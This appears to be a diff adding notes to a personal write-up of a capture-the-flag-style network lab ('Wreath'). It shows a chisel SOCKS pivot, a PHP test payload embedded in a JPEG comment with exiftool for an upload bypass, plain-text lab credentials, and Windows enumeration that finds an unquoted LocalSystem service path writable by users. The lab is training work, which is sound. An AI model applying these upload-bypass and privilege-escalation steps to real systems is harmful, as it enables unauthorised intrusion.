@@ -233,6 +233,166 @@ and
 └─$ chisel client 127.0.0.1:18002 9090:socks
 2024/01/31 03:48:52 client: Connecting to ws://127.0.0.1:18002
 
+<h2>Task 37  Personal PC Exploit PoC </h2>
+
+└─$ exiftool test-duke.jpeg.php 
+ExifTool Version Number         : 12.57
+File Name                       : test-duke.jpeg.php
+Directory                       : .
+File Size                       : 178 kB
+File Modification Date/Time     : 2023:03:20 03:46:15-05:00
+File Access Date/Time           : 2024:01:31 04:33:59-06:00
+File Inode Change Date/Time     : 2024:01:31 04:34:17-06:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 1181
+Image Height                    : 665
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 1181x665
+Megapixels                      : 0.785
+                                                                                                                                                                                                                                           
+┌──(duke㉿kali)-[~/Documents/THM_Wreath]
+└─$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-duke.jpeg.php 
+    1 image files updated
+                                                                                                                                                                                                                                           
+┌──(duke㉿kali)-[~/Documents/THM_Wreath]
+└─$ exiftool test-duke.jpeg.php                                                             
+ExifTool Version Number         : 12.57
+File Name                       : test-duke.jpeg.php
+Directory                       : .
+File Size                       : 178 kB
+File Modification Date/Time     : 2024:01:31 04:35:21-06:00
+File Access Date/Time           : 2024:01:31 04:35:21-06:00
+File Inode Change Date/Time     : 2024:01:31 04:35:21-06:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
+Image Width                     : 1181
+Image Height                    : 665
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 1181x665
+Megapixels                      : 0.785
+
+/resources
+usr:thomas
+psw:i<3ruby
+
+exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php
+
+## 
+run
+/resources/uploads/test-USERNAME.jpeg.php
+vhups
+
+<h2>Task 42  AV Evasion Enumeration </h2>
+
+# C:\xampp\htdocs\resources\uploads>whoami
+wreath-pc\thomas
+
+# C:\xampp\htdocs\resources\uploads>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+# C:\xampp\htdocs\resources\uploads>whoami /groups
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+
+# C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
+Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
+Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
+AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
+LSM                                                                                 LSM                                                                                                                                   Unknown    
+Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
+NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
+Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
+System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
+Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
+Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
+Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     
+
+
+# C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
+sc qc SystemExplorerHelpService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+# C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
+Owner  : BUILTIN\Administrators
+Group  : WREATH-PC\None
+Access : BUILTIN\Users Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         BUILTIN\Users Allow  ReadAndExecute, Synchronize
+         BUILTIN\Users Allow  -1610612736
+         CREATOR OWNER Allow  268435456
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
+Audit  : 
+Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
+         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
+         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
+         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
+         ;;S-1-15-2-2)
+
 
 
 </code>
